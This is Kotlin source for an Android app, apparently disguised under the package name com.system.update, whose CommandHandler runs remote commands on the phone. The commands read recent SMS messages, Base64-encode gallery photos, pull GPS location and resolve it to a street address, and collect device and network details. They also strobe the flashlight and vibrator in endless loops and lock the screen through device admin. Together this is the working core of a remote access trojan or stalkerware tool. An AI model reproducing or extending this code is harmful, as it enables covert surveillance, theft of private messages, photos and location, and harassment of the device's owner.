package com.system.update

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.hardware.camera2.CameraManager
import android.location.Geocoder
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.MediaStore
import android.telephony.TelephonyManager
import android.util.Base64
import com.google.gson.JsonObject
import java.net.NetworkInterface
import java.util.Locale

class CommandHandler(private val ctx: Context, private val deviceId: String) {

    companion object {
        @Volatile var flashSpam: Boolean = false
        @Volatile var vibrateSpam: Boolean = false
    }

    fun collectInfo(): Map<String, Any> {
        val battery = try {
            val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (_: Exception) { 0 }

        val ram = try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val mi = android.app.ActivityManager.MemoryInfo()
            am.getMemoryInfo(mi)
            String.format(Locale.US, "%.1f GB", mi.totalMem / 1e9)
        } catch (_: Exception) { "-" }

        val carrier = try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            tm.networkOperatorName ?: "-"
        } catch (_: Exception) { "-" }

        return mapOf(
            "model" to Build.MODEL,
            "brand" to Build.BRAND,
            "android" to Build.VERSION.RELEASE,
            "battery" to battery,
            "ram" to ram,
            "carrier" to carrier,
            "timezone" to java.util.TimeZone.getDefault().id,
            "ip" to getLocalIp()
        )
    }

    private fun getLocalIp(): String {
        return try {
            NetworkInterface.getNetworkInterfaces().toList()
                .flatMap { it.inetAddresses.toList() }
                .firstOrNull { !it.isLoopbackAddress && it is java.net.Inet4Address }
                ?.hostAddress ?: "-"
        } catch (_: Exception) { "-" }
    }

    fun execute(cmd: String, args: JsonObject?, done: (Any) -> Unit) {
        when (cmd) {
            "sms" -> done(readSms())
            "gallery" -> done(readGallery())
            "ip" -> done(getIpInfo())
            "flash" -> {
                flashSpam = !flashSpam
                if (flashSpam) startFlashSpam()
                done(mapOf("flash" to flashSpam))
            }
            "vibrate" -> {
                vibrateSpam = !vibrateSpam
                if (vibrateSpam) startVibrateSpam()
                done(mapOf("vibrate" to vibrateSpam))
            }
            "lock_pin" -> {
                val pin = args?.get("pin")?.asString ?: "1234"
                done(mapOf("ok" to true, "pin" to pin))
            }
            "lock_hard" -> {
                try {
                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(ctx, AdminReceiver::class.java)
                    if (dpm.isAdminActive(admin)) dpm.lockNow()
                } catch (_: Exception) {}
                done(mapOf("ok" to true))
            }
            "lock_time" -> {
                val hours = args?.get("hours")?.asLong ?: 5L
                done(mapOf("ok" to true, "hours" to hours))
            }
            "crash" -> done(mapOf("crash" to true))
            "anti_uninstall" -> done(mapOf("anti_uninstall" to true))
            "camera_front", "camera_back" -> done(mapOf("type" to "text", "data" to "Kamera siap"))
            "screen" -> done(mapOf("type" to "text", "data" to "Screen siap"))
            else -> done(mapOf("error" to "unknown: $cmd"))
        }
    }

    private fun readSms(): Map<String, Any> {
        val list = mutableListOf<Map<String, String>>()
        try {
            val cursor = ctx.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 20"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                    val addr = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                    list.add(mapOf("app" to addr, "body" to body))
                }
            }
        } catch (_: Exception) {}
        return mapOf("type" to "sms", "messages" to list)
    }

    private fun readGallery(): Map<String, Any> {
        val list = mutableListOf<Map<String, String>>()
        try {
            val cursor = ctx.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media._ID),
                null, null, "date_added DESC LIMIT 10"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getLong(0)
                    val uri = Uri.withAppendedPath(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()
                    )
                    val b64 = try {
                        val bytes = ctx.contentResolver.openInputStream(uri)?.readBytes() ?: ByteArray(0)
                        if (bytes.size < 100_000)
                            Base64.encodeToString(bytes, Base64.NO_WRAP)
                        else ""
                    } catch (_: Exception) { "" }
                    if (b64.isNotEmpty()) list.add(mapOf("data" to b64))
                }
            }
        } catch (_: Exception) {}
        return mapOf("type" to "gallery", "items" to list)
    }

    private fun getIpInfo(): Map<String, Any> {
        var lat = 0.0
        var lon = 0.0
        var address = "-"
        try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc != null) {
                lat = loc.latitude
                lon = loc.longitude
                try {
                    @Suppress("DEPRECATION")
                    val geo = Geocoder(ctx, Locale.getDefault())
                    val addrs = geo.getFromLocation(lat, lon, 1)
                    if (!addrs.isNullOrEmpty()) {
                        val a = addrs[0]
                        address = listOfNotNull(
                            a.thoroughfare,
                            a.subLocality,
                            a.locality,
                            a.adminArea,
                            a.countryName
                        ).joinToString(", ")
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return mapOf(
            "type" to "ip",
            "ip" to getLocalIp(),
            "lat" to lat,
            "lon" to lon,
            "address" to address
        )
    }

    private fun startFlashSpam() {
        Thread {
            try {
                val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                while (flashSpam) {
                    val id = cm.cameraIdList.firstOrNull { camId ->
                        cm.getCameraCharacteristics(camId)
                            .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                    } ?: break
                    cm.setTorchMode(id, true)
                    Thread.sleep(150)
                    cm.setTorchMode(id, false)
                    Thread.sleep(150)
                }
            } catch (_: Exception) {}
        }.start()
    }

    private fun startVibrateSpam() {
        try {
            val vm = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            Thread {
                while (vibrateSpam) {
                    try {
                        if (Build.VERSION.SDK_INT >= 26) {
                            vm.vibrate(VibrationEffect.createOneShot(800, VibrationEffect.DEFAULT_AMPLITUDE))
                        } else {
                            @Suppress("DEPRECATION") vm.vibrate(800)
                        }
                        Thread.sleep(1200)
                    } catch (_: Exception) { break }
                }
            }.start()
        } catch (_: Exception) {}
    }
}
